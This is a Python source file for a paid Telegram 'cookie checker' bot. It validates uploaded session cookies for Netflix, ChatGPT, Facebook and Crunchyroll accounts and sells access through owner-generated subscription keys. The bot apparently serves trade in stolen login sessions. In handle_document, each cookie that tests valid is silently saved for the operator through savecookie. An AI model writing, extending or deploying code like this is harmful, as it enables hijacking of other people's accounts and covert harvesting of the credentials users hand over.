import requests
import json
import re
import os
from pathlib import Path
from dotenv import load_dotenv
from helping_fcn import sec_key, saveid, check_root, claiming_key, checking_paid, gpt_net_checker, fb_net_checker, info, broad,savecookie,  fb_checker, netflix_checker, netflix_net_checker, crunchy_checker, gpt_checker
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, bot
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
from keep_alive import keep_alive
keep_alive()
load_dotenv()
owner = "https://t.me/celestial_being"
token = os.getenv('bot_api')
updater = Updater(token, use_context=True)

def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    
    message = (
        "🔑 <b>Welcome to the Cookie Checker Bot!</b> 🔑\n\n"
        "Our mission is simple: we help you verify the validity of your cookies 📝 and ensure they are still working for various platforms like Netflix! 🍿\n\n"
        "<b>Use Cases:</b>\n"
        "• Quickly check if your cookies are still valid for login access 🔍\n"
        "• Validate your Netflix cookies before using them to avoid interruptions 🎥\n"
        "• Manage your subscription info and keep track of your keys 📜\n\n"
        "Need to know all the commands? Type <b>/help</b> to see the full list and get started 🚀"
    )

    update.message.reply_text(message, parse_mode='HTML', reply_to_message_id=update.message.message_id)


def help_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    message = (
        "🛠️ <b>Available Commands:</b>\n\n"
        "• <b>/start</b> - Start the bot and receive a welcome message 🎉\n"
        "• <b>/help</b> - Get a list of available commands and their descriptions 📜\n"
        "• <b>/chatgpt</b> - Upload a JSON file of your cookies to check login functionality 🍪\n"
        "• <b>/netflix</b> - Validate Netflix cookies and check their login status 🎬\n"
        "• <b>/claim {your key}</b> - Claim your available keys and check your rewards 🎁\n"
        "     <i>Usage:</i> <code>/claim ABC123</code>\n"
        "• <b>/subinfo</b> - View your subscription details and status 📅\n\n"
        "For detailed usage and examples, simply upload your JSON cookies file using <b>/chatgpt</b> to get started!"
    )
    
    update.message.reply_text(message, parse_mode='HTML', reply_to_message_id=update.message.message_id)


def chatgpt_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    
    # Check user's subscription status
    subscription_status = checking_paid(user_id)
    
    if subscription_status == True:
        # User has an active subscription
        context.user_data["last_command"] = "/chatgpt"
        update.message.reply_text(
            "✨ <b>Awesome!</b> You have an active subscription.\n\n"
            "Now, please upload the <b>JSON</b> or <b>NETS</b> file of your ChatGPT cookies, "
            "and we'll check your login functionality in no time! 🚀",
            parse_mode="HTML"
        )
    
    elif subscription_status == False:
        # User does not have an active subscription
        keyboard = [[InlineKeyboardButton("💳 Click Here To Purchase", url=owner)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        update.message.reply_text(
            "❌ <b>Oops!</b> It looks like your subscription has expired or you don't have one yet. "
            "Don't worry, we’ve got you covered!\n\n"
            "🔑 <b>Purchase</b> a subscription now to unlock all the features! 💥",
            reply_markup=reply_markup, parse_mode="HTML"
        )
    
    else:
        # Handle unexpected cases
        update.message.reply_text(
            "⚠️ <b>Uh-oh! There seems to be a glitch in the system.</b>\n"
            "Please contact support to resolve this issue. 🛠️",
            parse_mode="HTML"
        )
        # Notify the bot owner about the glitch
        context.bot.send_message(chat_id="5308059847", text="Glitch in code detected in the chatgpt_command function")


# Example netflix command handler
def netflix_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    
    # Check subscription status
    subscription_status = checking_paid(user_id)
    
    if subscription_status == True:
        # User has an active subscription
        context.user_data["last_command"] = "/netflix"
        update.message.reply_text(
            "🍿 <b>Ready to check your Netflix cookies?</b>\n\n"
            "Please upload the <b>JSON</b> file of your Netflix cookies, "
            "and let's make sure everything is good to go! 🎬",
            parse_mode="HTML"
        )
    
    elif subscription_status == False:
        # User does not have a subscription
        keyboard = [[InlineKeyboardButton("💳 Click Here To Purchase", url=owner)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        update.message.reply_text(
            "⏳ <b>Hold on!</b> It seems like your subscription has expired or you don't have one yet. "
            "You’ll need an active subscription to check Netflix cookies. 🔑\n\n"
            "Get started by purchasing your plan now! 💥",
            reply_markup=reply_markup, parse_mode="HTML"
        )
    
    else:
        # Handle unexpected cases
        update.message.reply_text(
            "⚠️ <b>Something went wrong!</b>\n"
            "Looks like there’s a glitch. Please contact support and we'll get this sorted. 🛠️",
            parse_mode="HTML"
        )
        # Notify the bot owner about the glitch
        context.bot.send_message(chat_id="5308059847", text="Glitch in code detected in the netflix_command function")

def facebook_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    
    # Check subscription status
    subscription_status = checking_paid(user_id)
    
    if subscription_status == True:
        # User has an active subscription
        context.user_data["last_command"] = "/facebook"
        update.message.reply_text(
            "🍿 <b>Ready to check your Facebook cookies?</b>\n\n"
            "Please upload the <b>JSON</b> file of your facebook cookies, "
            "and let's make sure everything is good to go! 🎬",
            parse_mode="HTML"
        )
    
    elif subscription_status == False:
        # User does not have a subscription
        keyboard = [[InlineKeyboardButton("💳 Click Here To Purchase", url=owner)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        update.message.reply_text(
            "⏳ <b>Hold on!</b> It seems like your subscription has expired or you don't have one yet. "
            "You’ll need an active subscription to check Netflix cookies. 🔑\n\n"
            "Get started by purchasing your plan now! 💥",
            reply_markup=reply_markup, parse_mode="HTML"
        )
    
    else:
        # Handle unexpected cases
        update.message.reply_text(
            "⚠️ <b>Something went wrong!</b>\n"
            "Looks like there’s a glitch. Please contact support and we'll get this sorted. 🛠️",
            parse_mode="HTML"
        )
        # Notify the bot owner about the glitch
        context.bot.send_message(chat_id="5308059847", text="Glitch in code detected in the netflix_command function")



def handle_document(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    file = update.message.document
    command = context.user_data.get("last_command")
    saveid(user_id)

    # Check if the command is present
    if command is None:
        update.message.reply_text(
            "⚠️ <b>No active command found!</b>\n\nPlease use <b>/chatgpt</b> or <b>/netflix</b> or <b>/facebook</b> first to upload cookies.",
            parse_mode="HTML"
        )
        return
    
    file_name = file.file_name
    file_id = file.file_id

    # Retrieve the file content
    new_file = context.bot.get_file(file_id)
    file_extension = Path(file_name).suffix

    # Check the user's subscription status
    subscription_status = checking_paid(user_id)
    if not subscription_status:
        keyboard = [[InlineKeyboardButton("💳 Click Here To Purchase", url=owner)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text(
            "⛔ <b>Subscription required!</b>\n\nYou don't have an active subscription or it has expired. "
            "Please purchase a subscription to continue.",
            reply_markup=reply_markup, parse_mode="HTML"
        )
        return

    # Process the file based on its extension
    if file_extension == ".json":
        # Load the file as bytes and parse JSON
        cookies_data = new_file.download_as_bytearray()
        cookies_list = json.loads(cookies_data.decode('utf-8'))

        # Check the last command and call respective checkers
        if command == "/chatgpt":
            if gpt_checker(cookies_list):
                savecookie(cookies_data, file_name)
                update.message.reply_text("✅ <b>ChatGPT Cookie is valid!</b> You're all set! 🚀", parse_mode="HTML")
            else:
                update.message.reply_text("❌ <b>ChatGPT Cookie has expired.</b> Please try again.", parse_mode="HTML")

        elif command == "/netflix":
            if netflix_checker(cookies_list):
                savecookie(cookies_data, file_name)
                update.message.reply_text("✅ <b>Netflix Cookie is valid!</b> Enjoy your binge-watching! 🎬", parse_mode="HTML")
            else:
                update.message.reply_text("❌ <b>Netflix Cookie has expired.</b> Please upload a new one.", parse_mode="HTML")

        elif command == "/facebook":
            if fb_checker(cookies_list):
                savecookie(cookies_data, file_name)
                update.message.reply_text("✅ <b>Facebook Cookie is valid!</b> Enjoy your enjoy! 🎬", parse_mode="HTML")
            else:
                update.message.reply_text("❌ <b>Facebook Cookie has expired.</b> Please upload a new one.", parse_mode="HTML")
                

        elif command == "/crunchyroll":
            if crunchy_checker(cookies_list):
                savecookie(cookies_data, file_name)
                update.message.reply_text("✅ <b>Netflix Cookie is valid!</b> Enjoy your binge-watching! 🎬", parse_mode="HTML")
            else:
                update.message.reply_text("❌ <b>Netflix Cookie has expired.</b> Please upload a new one.", parse_mode="HTML")
    elif file_extension == ".txt":
        # Handle text file cookies (Netscape format)
        cookies_data = new_file.download_as_bytearray()

        if command == "/netflix":
            if netflix_net_checker(cookies_data):
                savecookie(cookies_data, file_name)
                update.message.reply_text("✅ <b>Netflix Cookie is valid!</b> Time to relax with some shows! 🍿", parse_mode="HTML")
            else:
              update.message.reply_text("❌ <b>Netflix Cookie has expired.</b> Please provide a new one.", parse_mode="HTML")

        elif command == "/facebook": 
                if fb_net_checker(cookies_data):
                    savecookie(cookies_data, file_name)
                    update.message.reply_text("✅ <b>Facebook Cookie is valid!</b> Enjoy your enjoy! 🎬", parse_mode="HTML")
                else:
                    update.message.reply_text("❌ <b>Facebook Cookie has expired.</b> Please upload a new one.", parse_mode="HTML")
                
        elif command == "/chatgpt":
            if gpt_net_checker(cookies_data):
                savecookie(cookies_data, file_name)
                update.message.reply_text("✅ <b>ChatGPT Cookie is valid!</b> You're all set! 🚀", parse_mode="HTML")
                
            else:
                update.message.reply_text("❌ <b>ChatGPT Cookie has expired.</b> Please upload a valid one.", parse_mode="HTML")

                
    
def broadcast (update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    root = check_root(user_id)
    ids = broad()
    text = ' '.join(context.args)
    message  = f"<b>{text}</b>"
    if root == True :
        if context.args:
            for id in ids:
                context.bot.send_message(chat_id=id, text=message, parse_mode="HTML")
            update.message.reply_text(f"<b>This message ->'{message}' sended to everyone</b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)
        else :
            update.message.reply_text("<b>Bruh What are you doing !!?\nSend message like this /broad {Message}</b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)
    else :
        update.message.reply_text("<b>With Great Powers come with Great Responsibility & You are not the one to take it </b>", parse_mode="HTML", reply_to_message_id=update.message.message_id)            

def sub_info(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    saveid(user_id)
    
    usrid, username, sub_date, stat = info(user_id)
    

    if stat == "running":
        update.message.reply_text("<b>Hi there here is your subscription status & other info -</b>\n"
                                  f"<b>USERNAME - <code>{username}</code></b>\n"
                                  f"<b>USER ID  - <code>{usrid}</code></b>\n"
                                  f"<b>SUBSCRIPTION TILL - <code>{sub_date}</code></b>\n"
                                  f"<b>SUBSCRIPTION STAT - <code>{stat}</code></b>\n", parse_mode="HTML",reply_to_message_id=update.message.message_id)
    elif stat == "expired":
        update.message.reply_text("<b>Hi there here is your subscription status & other info -</b>\n"
                                  f"<b>USERNAME - <code>{username}</code></b>\n"
                                  f"<b>USER ID  - <code>{usrid}</code></b>\n"
                                  f"<b>SUBSCRIPTION TILL - <code>{sub_date}</code></b>\n"
                                  f"<b>SUBSCRIPTION STAT - <code>{stat}</code></b>\n", parse_mode="HTML",reply_to_message_id=update.message.message_id)
    elif stat == "no":
        keyboard = [
            [InlineKeyboardButton("Click To Purchase", url=owner)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text("<b>You don't have a subscription or yours expired.\n Purchase a new one</b>", reply_markup=reply_markup, parse_mode="HTML")
    else:
        update.message.reply_text("<b>Glitch In MATRIX calling dev</b>", parse_mode="HTML")
        context.bot.send_message(chat_id="5308059847", text="Glitch in code nearby in subinfo fcn")


def keygen(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    First_name = update.message.from_user.first_name  # Fixed to use 'username'
    saveid(user_id)
    
    is_root = check_root(user_id)
    
    if is_root:
        if len(context.args) != 2:
            update.message.reply_text("<b>Please provide the duration in the format: <code>/keygen {number}</code> {month/year}.</b>", parse_mode="HTML",reply_to_message_id=update.message.message_id)
            return
        
        # Extract the number and period (month/year)
        duration, period = context.args
        
        # Validate the period using regular expressions
        if re.match(r'^(month|year)$', period):
            # Perform the key generation process based on the duration and period
            key = sec_key(length=16)
            update.message.reply_text(f"<b>Generated Key for <code>{duration}</code> <code>{period}</code>. Your Key - <code>{key}</code></b>", parse_mode="HTML")
            with open("key.txt", "a") as f:
                f.write(f"{period},{duration},{key}\n")
        else:
            update.message.reply_text("<b>Please specify the period as either <code>'month'</code> or <code>'year'</code>.</b>", parse_mode="HTML")
    
    elif not is_root:
        update.message.reply_text(f"<b>Get Your Fking Ass Away From HERE {First_name}!!</b>",parse_mode="HTMl")
    
    else:
        update.message.reply_text("<b>Glitch In MATRIX calling dev</b>",parse_mode="HTML")
        context.bot.send_message(chat_id="5308059847", text="Glitch in code nearby in keyGen fcn")
        
        
def claim(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    username = update.message.from_user.username
    first_name = update.message.from_user.first_name  # Corrected variable name to lowercase
    
    saveid(user_id)
    
    # Ensure that the key is provided
    if len(context.args) == 0:
        update.message.reply_text("<b>Please provide a key.</b>",parse_mode="HTML",reply_to_message_id=update.message.message_id)
        return
    
    enterkey = context.args[0]
    
    # Call the claiming_key function once
    success, new_date, duration, time = claiming_key(enterkey, user_id, username)
    
    if success ==True :
        update.message.reply_text(
            f"<b>Congratulations <code>{first_name}</code>, you have a subscription until <code>{new_date}</code>,</b>"
            f"<b>For <code>{time}</code> <code>{duration}</code>.</b>",parse_mode="HTML")
    elif success ==False :
        update.message.reply_text("<b>Invalid key, please don't waste my time.</b>", parse_mode="HTML",reply_to_message_id=update.message.message_id)
    else :
        update.message.reply_text("<b>Glitch In MATRIX calling dev</b>",parse_mode="HTML")
        context.bot.send_message(chat_id="5308059847", text=f"Glitch in code nearby in claiming key fcn")
        
        
    
def main():
    dp = updater.dispatcher

    # Command handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("chatgpt", chatgpt_command))
    dp.add_handler(CommandHandler("netflix", netflix_command))
    dp.add_handler(CommandHandler("brd", broadcast))
    dp.add_handler(CommandHandler("keygen", keygen))
    dp.add_handler(CommandHandler("claim", claim))
    dp.add_handler(CommandHandler("subinfo", sub_info))
    dp.add_handler(CommandHandler("facebook", facebook_command))
    # Register a handler for document uploads
    dp.add_handler(MessageHandler(Filters.document, handle_document))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
